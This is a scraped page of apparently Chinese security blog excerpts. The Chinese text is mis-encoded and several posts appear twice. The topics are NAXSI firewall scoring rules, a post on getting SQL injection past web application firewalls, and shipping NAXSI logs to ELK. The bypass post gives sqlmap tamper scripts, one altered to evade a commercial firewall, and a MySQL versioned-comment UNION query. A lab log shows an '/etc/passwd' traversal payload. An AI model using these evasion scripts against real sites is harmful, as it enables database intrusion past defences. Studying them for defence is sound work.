<pre class="line-numbers language-none"><code class="language-none">LOG, BLOCK, DROP, ALLOW<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ä½•æ—¶æ‰§è¡Œè¿™å››ç§åŠ¨ä½œï¼Ÿæ ¹æ®åˆ¶å®šçš„å¾—åˆ†(score)</p>
<p>####Basic Usage</p>
<pre class="line-numbers language-none"><code class="language-none">CheckRule &quot;$SQL &gt;&#x3D; 8&quot; BLOCK;
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å¦‚æœ<code>$SQL</code>å¤§äºç­‰äº8ï¼Œåˆ™<code>BLOCK</code>æ‰è¿™ä¸ªè¯·æ±‚ã€‚ï¼ˆå‰ææ˜¯æ‰“å¼€é˜²ç«å¢™çš„è¿‡æ»¤æ¨¡å¼ï¼Œè€Œä¸æ˜¯learningæ¨¡å¼ï¼‰</p>
<p>####Other Usages<br>çœ‹çœ‹å¦å¤–çš„ä¸€ç§ç”¨æ³•ï¼Œç™½åå•å’Œé»‘åå•ä¸€èµ·ç”¨çš„æ—¶å€™ï¼Œæ¯”å¦‚æœ‰è¿™æ ·çš„è§„åˆ™:</p>
<pre class="line-numbers language-none"><code class="language-none">CheckRule &quot;$UWA &gt;&#x3D; 4&quot; DROP;
CheckRule &quot;$XSS &gt;&#x3D; 8&quot; BLOCK;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2017/11/02/naxsi.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<ul>
<li>MainRule: å®šä¹‰æ£€æµ‹çš„è§„åˆ™å’Œåˆ†æ•°</li>
<li>BasicRule: å®šä¹‰MainRuleçš„ç™½åå•</li>
<li>CheckRule: å®šä¹‰å½“åˆ†å€¼è¾¾åˆ°é˜ˆå€¼é‡‡å–çš„åŠ¨ä½œ</li>
</ul>
<h3 id="Checkrules"><a href="#Checkrules" class="headerlink" title="Checkrules"></a>Checkrules</h3><p>CheckrulesæŒ‡ä»¤æœ‰å››ç§åŠ¨ä½œï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">LOG, BLOCK, DROP, ALLOW<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ä½•æ—¶æ‰§è¡Œè¿™å››ç§åŠ¨ä½œï¼Ÿæ ¹æ®åˆ¶å®šçš„å¾—åˆ†(score)</p>
<p>####Basic Usage</p>
<pre class="line-numbers language-none"><code class="language-none">CheckRule &quot;$SQL &gt;&#x3D; 8&quot; BLOCK;
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å¦‚æœ<code>$SQL</code>å¤§äºç­‰äº8ï¼Œåˆ™<code>BLOCK</code>æ‰è¿™ä¸ªè¯·æ±‚ã€‚ï¼ˆå‰ææ˜¯æ‰“å¼€é˜²ç«å¢™çš„è¿‡æ»¤æ¨¡å¼ï¼Œè€Œä¸æ˜¯learningæ¨¡å¼ï¼‰</p>
<p>####Other Usages<br>çœ‹çœ‹å¦å¤–çš„ä¸€ç§ç”¨æ³•ï¼Œç™½åå•å’Œé»‘åå•ä¸€èµ·ç”¨çš„æ—¶å€™ï¼Œæ¯”å¦‚æœ‰è¿™æ ·çš„è§„åˆ™:</p>
<pre class="line-numbers language-none"><code class="language-none">CheckRule &quot;$UWA &gt;&#x3D; 4&quot; DROP;
CheckRule &quot;$XSS &gt;&#x3D; 8&quot; BLOCK;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2017/11/02/naxsi.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/10/30/bypass-sql-firewall.html" >bypass firewall</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-10-30  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>ç‹—çš„ç»•è¿‡æ¯”è¾ƒç®€å•ï¼Œè¿˜æ˜¯å†™ä¸€ä¸‹ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://secvul.com/topics/876.html">https://secvul.com/topics/876.html</a><br><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/network/150646.html">http://www.freebuf.com/articles/network/150646.html</a></p>
<p>æ ¹æ®ä¼—å¤šæ–‡ç« çš„è§£é‡Šï¼Œåªè¦æŠŠæ³¨é‡Šç¬¦ä¿®æ”¹ä¸‹ä¸­é—´åŠ ä¸ªå­—ç¬¦å°±å¯ä»¥è¿‡ç‹—äº†ï¼Œæ¯”å¦‚: <code>/**a**/</code>ï¼Œtamper.pyå¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python

&quot;&quot;&quot;
Copyright (c) 2006-2017 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)
See the file &#39;doc&#x2F;COPYING&#39; for copying permission
&quot;&quot;&quot;

from lib.core.enums import PRIORITY

__priority__ &#x3D; PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    &quot;&quot;&quot;
    Replaces space character (&#39; &#39;) with comments &#39;&#x2F;**&#x2F;&#39;

    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass weak and bespoke web application firewalls

    &gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
    &#39;SELECT&#x2F;**&#x2F;id&#x2F;**&#x2F;FROM&#x2F;**&#x2F;users&#39;
    &quot;&quot;&quot;

    retVal &#x3D; payload

    if payload:
        retVal &#x3D; &quot;&quot;
        quote, doublequote, firstspace &#x3D; False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace &#x3D; True
                    retVal +&#x3D; &quot;&#x2F;**s**&#x2F;&quot;
                    continue

            elif payload[i] &#x3D;&#x3D; &#39;\&#39;&#39;:
                quote &#x3D; not quote

            elif payload[i] &#x3D;&#x3D; &#39;&quot;&#39;:
                doublequote &#x3D; not doublequote

            elif payload[i] &#x3D;&#x3D; &quot; &quot; and not doublequote and not quote:
                retVal +&#x3D; &quot;&#x2F;**s**&#x2F;&quot;
                continue

            retVal +&#x3D; payload[i]

    return retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ç±³æœ‰ç¥é©¬æŠ€æœ¯å«é‡ï¼Œç„¶åæ˜¯ç»•è¿‡æ•°å­—å«å£«çš„ï¼Œè¿™ä¸ªå¾—åˆ†ä¸ªç±»ï¼ŒUNIONå’ŒErroræ³¨å…¥ï¼Œå¯¹äºè¿™æ ·çš„æ³¨å…¥éœ€è¦ä¿®æ”¹ä»¥ä¸‹çš„æ­¥éª¤ï¼š<br>é¦–å…ˆæ˜¯ä¿®æ”¹tamper:</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python

&quot;&quot;&quot;
Copyright (c) 2006-2017 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)
See the file &#39;LICENSE&#39; for copying permission
&quot;&quot;&quot;

import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.data import kb
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY
from lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS

__priority__ &#x3D; PRIORITY.HIGHER

def dependencies():
    singleTimeWarnMessage(&quot;tamper script &#39;%s&#39; is only meant to be run against %s &lt; 5.1&quot; % (os.path.basename(__file__).split(&quot;.&quot;)[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    &quot;&quot;&quot;
    Adds versioned MySQL comment before each keyword

    Requirement:
        * MySQL &lt; 5.1

    Tested against:
        * MySQL 4.0.18, 5.0.22

    Notes:
        * Useful to bypass several web application firewalls when the
          back-end database management system is MySQL
        * Used during the ModSecurity SQL injection challenge,
          http:&#x2F;&#x2F;modsecurity.org&#x2F;demo&#x2F;challenge.html

    &gt;&gt;&gt; tamper(&quot;value&#39; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#39;QDWa&#39;&#x3D;&#39;QDWa&quot;)
    &quot;value&#39;&#x2F;*!0UNION&#x2F;*!0ALL&#x2F;*!0SELECT&#x2F;*!0CONCAT(&#x2F;*!0CHAR(58,107,112,113,58),&#x2F;*!0IFNULL(CAST(&#x2F;*!0CURRENT_USER()&#x2F;*!0AS&#x2F;*!0CHAR),&#x2F;*!0CHAR(32)),&#x2F;*!0CHAR(58,97,110,121,58)),&#x2F;*!0NULL,&#x2F;*!0NULL#&#x2F;*!0AND &#39;QDWa&#39;&#x3D;&#39;QDWa&quot;
    &quot;&quot;&quot;

    def process(match):
        word &#x3D; match.group(&#39;word&#39;)
        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
            return match.group().replace(word, &quot;&#x2F;*!50001%s*&#x2F; &quot; % word)
        else:
            return match.group()

    retVal &#x3D; payload

    if payload:
        retVal &#x3D; re.sub(r&quot;(?&lt;&#x3D;\W)(?P&lt;word&gt;[A-Za-z_]+)(?&#x3D;\W|\Z)&quot;, lambda match: process(match), retVal)
        retVal &#x3D; retVal.replace(&quot; &#x2F;*!50001*&#x2F;&quot;, &quot;&#x2F;*!50001*&#x2F;&quot;)

    return retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>æ³¨é‡Šç»•è¿‡ï¼Œå¦‚æœ50001è¡¨ç¤ºå¦‚æœmysqlçš„ç‰ˆæœ¬æ˜¯5.00.01æˆ–è€…æ˜¯5.0.1å°±å¯ä»¥æ‰§è¡Œè¿™ä¸ªè¯­å¥</p>
</blockquote>
<p>æ¯”å¦‚mysqlç‰ˆæœ¬æ˜¯5.5.53:</p>
<blockquote>
<p><code>select * from users where id=1 /*!50553union*/ /*!50002select*/ 3,2,3 order by id desc;</code></p>
</blockquote>
<p>è¿™ä¸ªè¯­å¥æ˜¯å¯ä»¥æ‰§è¡ŒæˆåŠŸçš„ï¼Œå¦‚æœ50553å˜æˆ50554åˆ™æ‰§è¡Œå¤±è´¥</p>
	

	</div>
  <a type="button" href="/2017/10/30/bypass-sql-firewall.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>ç‹—çš„ç»•è¿‡æ¯”è¾ƒç®€å•ï¼Œè¿˜æ˜¯å†™ä¸€ä¸‹ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://secvul.com/topics/876.html">https://secvul.com/topics/876.html</a><br><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/network/150646.html">http://www.freebuf.com/articles/network/150646.html</a></p>
<p>æ ¹æ®ä¼—å¤šæ–‡ç« çš„è§£é‡Šï¼Œåªè¦æŠŠæ³¨é‡Šç¬¦ä¿®æ”¹ä¸‹ä¸­é—´åŠ ä¸ªå­—ç¬¦å°±å¯ä»¥è¿‡ç‹—äº†ï¼Œæ¯”å¦‚: <code>/**a**/</code>ï¼Œtamper.pyå¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python

&quot;&quot;&quot;
Copyright (c) 2006-2017 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)
See the file &#39;doc&#x2F;COPYING&#39; for copying permission
&quot;&quot;&quot;

from lib.core.enums import PRIORITY

__priority__ &#x3D; PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    &quot;&quot;&quot;
    Replaces space character (&#39; &#39;) with comments &#39;&#x2F;**&#x2F;&#39;

    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass weak and bespoke web application firewalls

    &gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
    &#39;SELECT&#x2F;**&#x2F;id&#x2F;**&#x2F;FROM&#x2F;**&#x2F;users&#39;
    &quot;&quot;&quot;

    retVal &#x3D; payload

    if payload:
        retVal &#x3D; &quot;&quot;
        quote, doublequote, firstspace &#x3D; False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace &#x3D; True
                    retVal +&#x3D; &quot;&#x2F;**s**&#x2F;&quot;
                    continue

            elif payload[i] &#x3D;&#x3D; &#39;\&#39;&#39;:
                quote &#x3D; not quote

            elif payload[i] &#x3D;&#x3D; &#39;&quot;&#39;:
                doublequote &#x3D; not doublequote

            elif payload[i] &#x3D;&#x3D; &quot; &quot; and not doublequote and not quote:
                retVal +&#x3D; &quot;&#x2F;**s**&#x2F;&quot;
                continue

            retVal +&#x3D; payload[i]

    return retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ç±³æœ‰ç¥é©¬æŠ€æœ¯å«é‡ï¼Œç„¶åæ˜¯ç»•è¿‡æ•°å­—å«å£«çš„ï¼Œè¿™ä¸ªå¾—åˆ†ä¸ªç±»ï¼ŒUNIONå’ŒErroræ³¨å…¥ï¼Œå¯¹äºè¿™æ ·çš„æ³¨å…¥éœ€è¦ä¿®æ”¹ä»¥ä¸‹çš„æ­¥éª¤ï¼š<br>é¦–å…ˆæ˜¯ä¿®æ”¹tamper:</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python

&quot;&quot;&quot;
Copyright (c) 2006-2017 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)
See the file &#39;LICENSE&#39; for copying permission
&quot;&quot;&quot;

import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.data import kb
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY
from lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS

__priority__ &#x3D; PRIORITY.HIGHER

def dependencies():
    singleTimeWarnMessage(&quot;tamper script &#39;%s&#39; is only meant to be run against %s &lt; 5.1&quot; % (os.path.basename(__file__).split(&quot;.&quot;)[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    &quot;&quot;&quot;
    Adds versioned MySQL comment before each keyword

    Requirement:
        * MySQL &lt; 5.1

    Tested against:
        * MySQL 4.0.18, 5.0.22

    Notes:
        * Useful to bypass several web application firewalls when the
          back-end database management system is MySQL
        * Used during the ModSecurity SQL injection challenge,
          http:&#x2F;&#x2F;modsecurity.org&#x2F;demo&#x2F;challenge.html

    &gt;&gt;&gt; tamper(&quot;value&#39; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#39;QDWa&#39;&#x3D;&#39;QDWa&quot;)
    &quot;value&#39;&#x2F;*!0UNION&#x2F;*!0ALL&#x2F;*!0SELECT&#x2F;*!0CONCAT(&#x2F;*!0CHAR(58,107,112,113,58),&#x2F;*!0IFNULL(CAST(&#x2F;*!0CURRENT_USER()&#x2F;*!0AS&#x2F;*!0CHAR),&#x2F;*!0CHAR(32)),&#x2F;*!0CHAR(58,97,110,121,58)),&#x2F;*!0NULL,&#x2F;*!0NULL#&#x2F;*!0AND &#39;QDWa&#39;&#x3D;&#39;QDWa&quot;
    &quot;&quot;&quot;

    def process(match):
        word &#x3D; match.group(&#39;word&#39;)
        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
            return match.group().replace(word, &quot;&#x2F;*!50001%s*&#x2F; &quot; % word)
        else:
            return match.group()

    retVal &#x3D; payload

    if payload:
        retVal &#x3D; re.sub(r&quot;(?&lt;&#x3D;\W)(?P&lt;word&gt;[A-Za-z_]+)(?&#x3D;\W|\Z)&quot;, lambda match: process(match), retVal)
        retVal &#x3D; retVal.replace(&quot; &#x2F;*!50001*&#x2F;&quot;, &quot;&#x2F;*!50001*&#x2F;&quot;)

    return retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>æ³¨é‡Šç»•è¿‡ï¼Œå¦‚æœ50001è¡¨ç¤ºå¦‚æœmysqlçš„ç‰ˆæœ¬æ˜¯5.00.01æˆ–è€…æ˜¯5.0.1å°±å¯ä»¥æ‰§è¡Œè¿™ä¸ªè¯­å¥</p>
</blockquote>
<p>æ¯”å¦‚mysqlç‰ˆæœ¬æ˜¯5.5.53:</p>
<blockquote>
<p><code>select * from users where id=1 /*!50553union*/ /*!50002select*/ 3,2,3 order by id desc;</code></p>
</blockquote>
<p>è¿™ä¸ªè¯­å¥æ˜¯å¯ä»¥æ‰§è¡ŒæˆåŠŸçš„ï¼Œå¦‚æœ50553å˜æˆ50554åˆ™æ‰§è¡Œå¤±è´¥</p>
	
	</div>
  <a type="button" href="/2017/10/30/bypass-sql-firewall.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/10/25/naxsi-elk.html" >NAXSIå’ŒELK</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-10-25  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>NAXSIé˜²ç«å¢™ä»‹ç»: <a target="_blank" rel="noopener" href="https://github.com/nbs-system/naxsi">https://github.com/nbs-system/naxsi</a><br>é…ç½®å®‰è£…: <a target="_blank" rel="noopener" href="https://klionsec.github.io/2017/09/18/naxsiwaf/">https://klionsec.github.io/2017/09/18/naxsiwaf/</a><br>ä¸»è¦åŠŸèƒ½ï¼š</p>
<p>è¿‡æ»¤XSSï¼ŒSQLæ³¨å…¥ï¼Œæ–‡ä»¶ä¸Šä¼ ï¼Œæ–‡ä»¶éå†</p>
<p>NAXSIæ‹¦æˆªæ”»å‡»ä¹‹åï¼Œä¼šäº§ç”Ÿå¯¹åº”çš„æ—¥å¿—ã€‚ç±»ä¼¼æ ¼å¼æ˜¯è¿™æ ·çš„ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">2017&#x2F;10&#x2F;25 14:52:34 [error] 896#0: *15 NAXSI_EXLOG: ip&#x3D;192.168.141.232&amp;server&#x3D;192.168.182.141&amp;uri&#x3D;&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&amp;id&#x3D;1200&amp;zone&#x3D;BODY&amp;var_name&#x3D;passwd&amp;content&#x3D;admin..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd, client: 192.168.141.232, server: _, request: &quot;POST &#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php HTTP&#x2F;1.1&quot;, host: &quot;192.168.182.141:8000&quot;, referrer: &quot;http:&#x2F;&#x2F;192.168.182.141:8000&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&quot;
2017&#x2F;10&#x2F;25 14:52:34 [error] 896#0: *15 NAXSI_FMT: ip&#x3D;192.168.141.232&amp;server&#x3D;192.168.182.141&amp;uri&#x3D;&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&amp;learning&#x3D;0&amp;vers&#x3D;0.55.3&amp;total_processed&#x3D;4&amp;total_blocked&#x3D;4&amp;block&#x3D;1&amp;cscore0&#x3D;$TRAVERSAL&amp;score0&#x3D;12&amp;zone0&#x3D;BODY&amp;id0&#x3D;1200&amp;var_name0&#x3D;passwd, client: 192.168.141.232, server: _, request: &quot;POST &#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php HTTP&#x2F;1.1&quot;, host: &quot;192.168.182.141:8000&quot;, referrer: &quot;http:&#x2F;&#x2F;192.168.182.141:8000&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>è¿™é‡Œæˆ‘æ‰“å¼€äº†naxsiçš„EXLOGå¼€å…³ï¼Œè¿™æ ·å½“æ”¶é›†åˆ°æ”»å‡»çš„æ—¥å¿—ï¼Œå¯ä»¥æŸ¥çœ‹å¯¹åº”çš„è¯·æ±‚å†…å®¹: <a target="_blank" rel="noopener" href="https://github.com/nbs-system/naxsi/wiki/naxsilogs">https://github.com/nbs-system/naxsi/wiki/naxsilogs</a><br>ç°åœ¨çš„ç›®æ ‡æ˜¯å¦‚ä½•æŠŠä¸Šé¢çš„æ—¥å¿—æ‰‹æ”¶é›†åˆ°elké‡Œé¢æ–¹ä¾¿å›¾å½¢åŒ–æŸ¥çœ‹ï¼Œä»¥ä¸‹æ“ä½œï¼Œå…ˆåœ¨logstashé‡Œé¢æ–°å»ºæ–‡ä»¶å¤¹ï¼Œå†™è‡ªå·±çš„æ­£åˆ™ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">logstash&gt; mkdir pattern
logstash&gt; cd pattern
logstash&gt; vim naxsi
DA1 \d&#123;4&#125;&#x2F;\d&#123;2&#125;&#x2F;\d&#123;2&#125;
TM1 \d&#123;2&#125;:\d&#123;2&#125;:\d&#123;2&#125;
LEVEL (\w+)
NUM1 \d+(?:#0: \*)
NUM2 \d+
EXLOG NAXSI_EXLOG
FMT NAXSI_FMT
ID1 (\d+)
ZONE \w+
VAR1  (.*)
CONTENT (.*)
T3 \w+
T4 HTTP&#x2F;1\.1&quot;, host: &quot;(.*)&quot;, referrer: &quot;
HOST (.*)
NAXSI %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG):\s\w+&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:hostname&#125;&amp;uri&#x3D;%&#123;PROG:filepath&#125;&amp;id&#x3D;%&#123;ID1:id&#125;&amp;zone&#x3D;%&#123;ZONE:zone&#125;&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;
NAXSI2 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG):\s\w+&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:hostname&#125;&amp;uri&#x3D;%&#123;PROG:filepath&#125;&amp;id&#x3D;%&#123;ID1:id&#125;&amp;zone&#x3D;%&#123;ZONE:zone&#125;&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;,\sreferrer:\s&quot;(?&lt;referrer&gt;(.*))
NAXSI3 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s(\d+(?:#0:\s\*))%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG)(.*)&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s(.*),\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;
NAXSI4 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s(\d+(?:#0:\s\*))%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG)(.*)&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s(.*),\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host&#125;&quot;,\sreferrer:\s&quot;(?&lt;referrer&gt;(.*))
FMT %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_FMT):\sip&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:server_ip&#125;&amp;uri&#x3D;%&#123;UNIXPATH:uri&#125;&amp;learning&#x3D;%&#123;HOST:learing&#125;&amp;vers&#x3D;%&#123;HOST:vers&#125;&amp;total_processed&#x3D;%&#123;HOST:toal_processed&#125;&amp;total_blocked&#x3D;%&#123;HOST:total_blocked&#125;&amp;block&#x3D;%&#123;HOST:block&#125;&amp;cscore0&#x3D;%&#123;HOST:attack&#125;&amp;score0&#x3D;%&#123;HOST:score0&#125;&amp;cscore1&#x3D;%&#123;HOST:xss&#125;&amp;score1&#x3D;%&#123;HOST:score&#125;&amp;zone0&#x3D;%&#123;WORD:args&#125;&amp;id0&#x3D;%&#123;NUMBER:id&#125;&amp;var_name0&#x3D;%&#123;HOST:varname&#125;,\sclient:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;
FMT_R %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_FMT):\sip&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:server_ip&#125;&amp;uri&#x3D;%&#123;UNIXPATH:uri&#125;&amp;learning&#x3D;%&#123;HOST:learing&#125;&amp;vers&#x3D;%&#123;HOST:vers&#125;&amp;total_processed&#x3D;%&#123;HOST:toal_processed&#125;&amp;total_blocked&#x3D;%&#123;HOST:total_blocked&#125;&amp;block&#x3D;%&#123;HOST:block&#125;&amp;cscore0&#x3D;%&#123;HOST:attack&#125;,\sclient:\s(.*)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸Šé¢è¿™ä¸€å¨ç¿”å°±æ˜¯è§£ææœ€ä¸Šé¢æ—¥å¿—çš„æ­£åˆ™ï¼Œå…¶ä¸­ç”¨åˆ°çš„æ˜¯NAXSI3,NAXSI4,FMT_R,å…¶ä»–æ˜¯è°ƒè¯•ç”¨çš„ã€‚ç„¶åçµ¦logstashæ·»åŠ plugin:</p>
<pre class="line-numbers language-none"><code class="language-none">bin&#x2F;logstash-plugin install logstash-filter-grok
bin&#x2F;logstash-plugin install logstash-filter-ruby<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>


<p>ç„¶åé…ç½®<code>/etc/logstash.conf</code>æ–‡ä»¶ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">input&#123;
     file &#123;
       path &#x3D;&gt; &quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs&#x2F;naxsi.err&quot;
       type &#x3D;&gt; &quot;naxsi-error&quot;
       start_position &#x3D;&gt; &quot;beginning&quot;
   			&#125;
&#125;
filter&#123;
     if [type] &#x3D;&#x3D; &quot;naxsi-error&quot; &#123;
	grok &#123;
